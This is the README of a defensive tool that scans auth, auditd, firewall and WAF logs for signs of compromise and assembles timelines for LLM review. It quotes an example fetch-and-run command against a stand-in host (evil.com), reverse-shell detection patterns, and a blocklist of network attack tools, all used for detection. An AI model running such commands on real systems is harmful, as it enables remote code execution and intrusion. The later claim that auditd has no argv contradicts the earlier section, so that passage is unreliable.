# IOC Hunter

Daily batch tool that scans your rotated `auth`, `auditd`, `ufw`, and
`safeline-waf` jsonl logs for indicators of compromise, correlates every
log entry touching a flagged IP/domain across all four sources, and writes
one combined timeline file for LLM analysis. Flagged indicators accumulate
in a local SQLite "running list" (`actors.db`) — no scoring, just facts
(which categories fired, first/last seen, hit count) so an LLM can weigh
them without inheriting a hidden bias.

## Usage

Run once/day after log rotation:

```bash
python3 main.py \
    --auth /path/to/auth_parsed.jsonl \
    --auditd /path/to/auditd_parsed.jsonl \
    --ufw /path/to/ufw_parsed.jsonl \
    --waf /path/to/safeline_parsed.jsonl \
    --outdir /path/to/ioc_output \
    --db /path/to/actors.db
```

All args default to values in `config.py` if omitted — edit those defaults
or add this as a daily cron job, e.g.:

```
15 0 * * * cd /opt/ioc_hunter && /usr/bin/python3 main.py >> /var/log/ioc_hunter.log 2>&1
```

Output: `ioc_output/ioc_report_YYYY-MM-DD.json` — a single file containing:
- `summary` — counts and which categories fired today
- `flagged_indicators` — one entry per flagged IP/domain with every reason it fired
- `timeline` — every related log line across all 4 sources for every flagged indicator, sorted by datetime, deduplicated (an event touching two flagged IPs appears once, tagged with both)

Feed the whole JSON file to an LLM for analysis, or read `flagged_indicators` yourself for a quick daily glance.

## What's detected, and from which log

| Category | Source | Notes |
|---|---|---|
| Brute force | auth | repeated failure messages / src_ip within window |
| Privilege escalation | auth, auditd (raw + merged) | failed root auth attempts; root PAM ops from non-standard tools; root with no traceable auid; direct setuid-family syscalls from unexpected binaries (see "Auditd argv & src_ip attribution" below) - **tightened to exclude routine sudo/login noise, see note below** |
| Persistence (new accounts, cron, ssh-keygen, etc.) | auth, auditd | account-management event types + binary blocklist |
| Malware | auditd | `exe` blocklist (nc, ncat, nmap, hydra, etc.) + execution from /tmp,/dev/shm |
| Reverse shell / suspicious command | auditd (merged SYSCALL+EXECVE) | regex against reconstructed argv (`/dev/tcp/`, `bash -i`, `curl\|bash`, `nc -e`, etc.) — see "Auditd argv & src_ip attribution" below |
| Port scanning | ufw | ≥N distinct dst_ports from one src_ip in a window |
| Repeated blocked connections | ufw | catches probing that isn't a classic multi-port scan |
| Unusual/new outbound connections | ufw | first-ever contact with an external destination (learns a baseline over time, only flags each new destination once) |
| SQL injection / Command injection / XSS / Directory traversal | waf | regex against `req_path`, decoded once and twice to catch encoding evasion |
| Scanner/attack-tool signatures | waf | user-agent match: sqlmap, nikto, nmap, gobuster, wpscan, etc. |
| IDOR (heuristic, low confidence) | waf | same src_ip requesting many distinct numeric IDs against the same path pattern with 2xx responses — **not proof**, just a pattern worth a look since there's no session/ownership data to confirm actual IDOR |
| Large response / possible exfil | waf | flat byte ceiling + relative-to-median-for-that-path check, using the `size` field you added |
| Domain observations | auth | best-effort regex extraction from free-text messages — sparse, since none of the four schemas has a dedicated domain field |

Dropped/not attempted, and why:
- **Beaconing** — dropped per your call (no reliable outbound-timing granularity in these logs).
- **SSRF, LFI/RFI** — would need query-string/param separation the WAF schema doesn't currently capture (only full `req_path`, so URL-embedded traversal/injection is still caught, but a param like `?url=http://169.254.169.254/` you'd want a dedicated field for).
- **Impossible travel** — no geolocation data anywhere.
- **Web shell detection** — no cross-log correlator specifically pairs "WAF POST to new path" with "auditd process spawn from www-data" yet; the pieces (malware exe detector + WAF path detectors) exist independently, but linking them by *time proximity* rather than just shared IP would take another pass if you want it.

## Auditd argv & src_ip attribution

`auditd_parser_patched.py` is an updated version of your parser. Two fixes plus one addition:

- **Fixed a quoting bug**: the original used `line.split()` on raw content, which breaks on any quoted value containing spaces — exactly what shows up in `EXECVE` argv for real payloads (e.g. `a2="curl -s http://evil.com/x.sh | bash"` would get shredded into garbage tokens). Replaced with a quote-safe key=value tokenizer.
- **Fixed `exe` extraction for kernel records**: `SYSCALL`/`EXECVE` lines don't have the `msg='...'` wrapper that PAM-generated lines (like `USER_CMD`) have, so `exe`/`comm` now falls back to the outer fields when the inner block is empty.
- **Added `argv` reconstruction**: for `type=EXECVE` lines, pulls `a0`..`a{argc-1}` into an `argv` list and a joined `cmdline` string (hex-decoding any unquoted hex-encoded arguments auditd produces for unsafe characters).

Swap this in for your current parser (same file structure, same output path convention).

**Why this alone isn't enough — the correlation problem:** kernel exec records (`SYSCALL`/`EXECVE`) never carry a `src_ip` — only session/login records do, tagged with the same `ses` (session ID) but a *different* `audit_event_id`. So attributing a reverse shell to an attacking IP takes two joins, not one:

1. **`audit_merge.py`** joins `SYSCALL` + `EXECVE` records sharing the same `audit_event_id` into one merged record with `exe` + `argv` + `cmdline` together.
2. It then backfills `src_ip` by finding the nearest-in-time record sharing the same `ses` that does carry a `src_ip`.

This backfill is deliberately conservative: if a given `ses` value is associated with more than one distinct IP across the day (session IDs do get reused), the merged record is marked `src_ip_ses_reuse_ambiguous: true` and lists every candidate IP rather than silently picking one — you'll see this called out directly in `reasons` in the report (`AMBIGUOUS - session id reused by multiple IPs: [...]`). Backfills more than an hour away from the nearest session record are marked `low_confidence` for the same reason. Treat ambiguous/low-confidence attributions as leads to verify, not settled facts.

`main.py` runs this merge automatically each day — nothing to configure unless you want to change the ambiguity time window (`SES_BACKFILL_LOW_CONFIDENCE_SECONDS` in `config.py`).

**Privilege escalation detection was tightened deliberately:** the original version flagged any `uid != auid`, which is true for nearly every login, sudo call, and cron job — not useful. It now only fires on:
- a failed root authentication/escalation attempt,
- a root-targeted PAM operation claimed by a binary that isn't `sudo`/`su`/`pkexec`/`doas`,
- a process running as `uid=0` with no traceable `auid` at all (root with no audit trail — a common signature of an exploited SUID binary), or
- a direct setuid-family syscall landing at root from a binary outside the standard tool/daemon allowlist.

**Tradeoff worth knowing:** routine, successful `sudo` usage by an authorized user is now silent — that's intentional (it's normal admin activity, not an IOC), but if you actually want a full audit trail of every root escalation regardless of legitimacy, that's a different, compliance-style goal from IOC detection and would need a separate log/report rather than folding it into this detector. Say so if you want that added.

The tool allowlists live in `config.py`: `KNOWN_PRIVESC_TOOLS` (sudo/su/pkexec/doas) and `KNOWN_SYSTEM_DAEMONS` (sshd/systemd/cron/etc.) — add anything specific to your stack.

## Handling high-volume, low-signal indicators (port scans, blocked connections)

At real-world scale, the vast majority of flagged indicators on an internet-facing box are routine scanning noise (`port_scan`, `repeated_blocked_connections`, `unusual_outbound`) - and a single persistent scanning bot can generate hundreds of near-identical blocked-packet log lines in a day. Dumping all of them into the report doesn't add analytical value (an LLM doesn't need to see 400 individual SYN packets) and bloats file size dramatically - in testing, this alone was responsible for most of a 24MB report.

For bundles whose categories are *entirely* low-signal (`config.LOW_SIGNAL_ONLY_CATEGORIES`), the correlator now includes only:
- `related_events`: a handful of example events (`MAX_RELATED_EVENTS_LOW_SIGNAL`, default 3)
- `related_events_stats`: aggregate facts computed from the full event set before trimming - `first_seen`, `last_seen`, `distinct_dst_ports`, `distinct_dst_ips` - so "hit 428 distinct ports over 23 hours" isn't lost just because the 428 individual packets aren't all included
- `related_event_count`: the true total, always uncapped

Any bundle with at least one higher-signal category (SQLi, reverse shell, malware, privilege escalation, etc.) keeps a much larger cap (`MAX_RELATED_EVENTS_HIGH_SIGNAL`, default 200) since completeness matters more there and they're rarely this voluminous anyway.

In testing this took a 24MB report down to ~5MB and a 69-chunk output down to 13 chunks, for the same underlying data. Both caps and the low-signal category list are in `config.py` - tune them if you want more/less detail.

**Second cap needed - `reasons` isn't covered by the events cap.** Several detectors (WAF injection/XSS/traversal, scanner UA, reverse-shell argv, setuid escalation) emit one `Flag` per matching record with no grouping. An attacker retrying the same payload hundreds of times in a day - very common for automated SQLi/scanner tools - produces hundreds of near-identical reason strings for one indicator, completely unbounded by `MAX_RELATED_EVENTS_*`. In testing, 500 repeated SQLi attempts from one IP alone produced 1,001 flags and 94KB of reason text before this fix.

`reasons` is now deduped (exact-duplicate strings collapsed) and capped to `MAX_REASONS_PER_INDICATOR` (default 15, first/last sample), with `reason_count` always showing the true total and `reasons_truncated` flagging when trimming happened - same pattern as the events cap.

## Splitting large reports for LLM analysis

`main.py` writes one combined JSON report per day. On a busy internet-facing box this can get large fast — port-scan and blocked-connection noise alone can produce thousands of flagged indicators — and a large report will exceed any LLM's context window (25MB+ is roughly 6-8 million tokens, well past even the largest context models once you account for the model's own reasoning/output space).

`chunk_report.py` splits the report without ever breaking apart one indicator's correlated events across two files — that would defeat the point of correlating them in the first place. It bin-packs whole actor bundles into size-bounded chunk files, plus writes a separate lightweight `summary.json` (every flagged indicator + reasons, no raw events) that's cheap enough to load first for a quick daily triage before deciding which detail chunks are worth feeding to an LLM.

```bash
python3 chunk_report.py ioc_output/ioc_report_2026-07-07.json --max-bytes 300000
# writes ioc_output/chunks/summary.json, chunk_0001.json, chunk_0002.json, ...
```

`--max-bytes` defaults to 300,000 (~75-100k tokens depending on content) — a safe size that leaves headroom in a 200k-token context window for instructions and the model's response. Lower it if you're using a smaller-context model.

Output is compact JSON (no pretty-printing) deliberately — indentation whitespace costs real tokens for no benefit to an LLM reading it.

**Known limitation at very large scale:** if your flagged-indicator count grows into the thousands, even `summary.json` can get large (a few MB) since it's one line of reasons per indicator. If you hit that, the summary would benefit from aggregating low-signal, high-volume categories (`port_scan`, `repeated_blocked_connections` — usually just internet background noise) into counts instead of per-IP text, keeping full detail only for higher-signal categories. Not built yet - let me know if you get there.

## Performance notes

Two things were fixed after real-world testing surfaced them:

- **Correlation was O(records x unique_indicators)** — it re-scanned the entire log set once per flagged indicator. At a few thousand indicators this could take from minutes to over an hour depending on hardware. Fixed by indexing every record by IP once up front, making correlation O(records) total regardless of how many indicators are flagged.
- **The actor DB committed to SQLite after every single upsert** — each commit forces an fsync to disk, so thousands of flags meant thousands of fsyncs (43.9s for ~18k upserts in testing, vs <1s batched). Fixed by batching all of a run's writes into one commit at the end.

`main.py` now prints elapsed time for each stage (load, merge, detect, correlate, total) so a slow run is visible and diagnosable rather than looking like a hang.

## Tuning

Everything you'll want to adjust lives in `config.py`:
- velocity thresholds (`BRUTE_FORCE_THRESHOLD`, `PORT_SCAN_THRESHOLD`, `IDOR_SEQUENTIAL_THRESHOLD`)
- `LARGE_RESPONSE_BYTES` / `LARGE_RESPONSE_RELATIVE_MULTIPLIER`
- `SCANNER_USER_AGENTS`, `MALWARE_EXE_BASENAMES`, `SUSPICIOUS_EXE_DIRS`, `PERSISTENCE_EXE_BASENAMES`
- the regex pattern lists for SQLi/cmd-injection/XSS/traversal

"Local" IPs (excluded from flagging and from the outbound baseline) are
anything `ipaddress` classifies as private, loopback, link-local,
multicast, unspecified, or reserved (covers all standard RFC1918/IPv6
ranges) — no separate whitelist to maintain.

## Files

```
main.py          entry point — run this daily
chunk_report.py  splits a large report into LLM-sized chunks (run after main.py if needed)
config.py        all tunable thresholds, patterns, blocklists
loaders.py       reads the 4 jsonl files, normalizes timestamps
actor_db.py      SQLite running list of flagged indicators + outbound baseline
correlator.py    pulls every log line touching a flagged indicator, builds combined timeline
utils.py         timestamp parsing, local-IP check, sliding-window velocity logic
detectors/
  auth.py        brute force, privesc hints, new accounts, domain extraction
  auditd.py      privilege escalation, malware exe blocklist, persistence
  ufw.py         port scanning, repeated blocks, new outbound destinations
  waf.py         SQLi/cmdi/XSS/traversal, scanner UAs, IDOR heuristic, large responses
```

## Known limitations worth knowing about

- **auditd has no argv** — malware/reverse-shell detection there is a
  binary-name/path blocklist, not real behavioral detection. A real
  reverse shell using `/bin/bash` alone (not `nc`) won't be caught.
- **WAF schema has no separated body/query string** — injection payloads
  sent via POST body won't be visible; only what appears in `req_path`.
- **IDOR heuristic has no session/user/ownership data** — it flags a
  *pattern* (sequential ID enumeration with success responses), not
  confirmed unauthorized access. Treat it as a lead, not a finding.
- **Domain extraction is sparse** — only auth log free text ever contains
  a domain-shaped string in your current schemas. If you want real domain
  IOC coverage, the WAF parser would need to capture the `Host` header.
